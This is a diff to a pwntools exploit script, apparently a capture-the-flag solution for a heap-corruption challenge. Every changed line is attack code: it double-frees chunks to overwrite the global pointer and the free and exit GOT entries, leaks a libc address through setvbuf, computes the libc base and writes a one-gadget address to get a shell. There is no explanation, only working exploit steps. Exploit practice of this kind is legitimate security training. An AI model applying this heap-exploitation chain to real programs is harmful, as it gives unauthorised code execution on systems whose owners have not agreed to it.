@@ -50,29 +50,41 @@ if __name__ == '__main__':
     name = "pwn newbie"
     p.recvuntil("whats your name")
     p.sendline(name)
-
-    # double free (size=0x20) for overwrite global
-    malloc(p, 0x20, 'JUNK')
+    # global -> puts@got (0x30)
+    malloc(p, 0x30, 'DUMMY')
     free(p)
     free(p)
-    malloc(p, 0x20, p64(elf.symbols['global']))
-    malloc(p, 0x20, 'JUNK')
-    # double free (size=0x28) for overwrite free@got -> puts@plt
-    malloc(p, 0x28, 'JUNK')
+    malloc(p, 0x30, p64(elf.symbols['global']))
+    malloc(p, 0x30, 'DUMMY')
+    # free@got -> puts@plt (0x20)
+    malloc(p, 0x20, 'DUMMY')
     free(p)
     free(p)
-    malloc(p, 0x28, p64(elf.got['free']))
-    malloc(p, 0x28, 'JUNK')
-    # double free (size=0x30) for overwrite exit@got
-    malloc(p, 0x30, 'JUNK')
+    malloc(p, 0x20, p64(elf.got['free']))
+    malloc(p, 0x20, 'DUMMY')
+    # exit@got -> One-Gadget (0x40)
+    malloc(p, 0x40, 'DUMMY')
     free(p)
     free(p)
-    malloc(p, 0x30, p64(elf.got['exit']))
-    malloc(p, 0x30, 'JUNK')
-
-    malloc(p, 0x28, p64(elf.plt['puts']))
-    malloc(p, 0x20, p64(elf.got['setbuf']))
-
+    malloc(p, 0x40, p64(elf.got['exit']))
+    malloc(p, 0x40, 'DUMMY')
+    # leak
+    malloc(p, 0x20, p64(elf.plt['puts']))
+    malloc(p, 0x30, p64(elf.got['setvbuf']))
     free(p)
+    p.recvuntil("ok that letter was bad anyways...\n")
+    setbuf_got_addr = unpack(p.recv()[:6]+b"\00\00")
+    log.info("setbuf@got: 0x{:06x}".format(setbuf_got_addr))
+    libc_base = setbuf_got_addr - libc.symbols['setvbuf']
+    log.info("libc base: 0x{:08x}".format(libc_base))
+    # exec One-Gadget
+    one_gadget_offset = 0x4f322
+    one_gadget = libc_base + one_gadget_offset
+    p.sendline(b"1")
+    p.recvuntil(b">")
+    p.sendline(str(0x40))
+    p.recvuntil(b"what should i write tho >")
+    p.sendline(p64(one_gadget))
+    p.sendline(b"4")
 
     p.interactive()
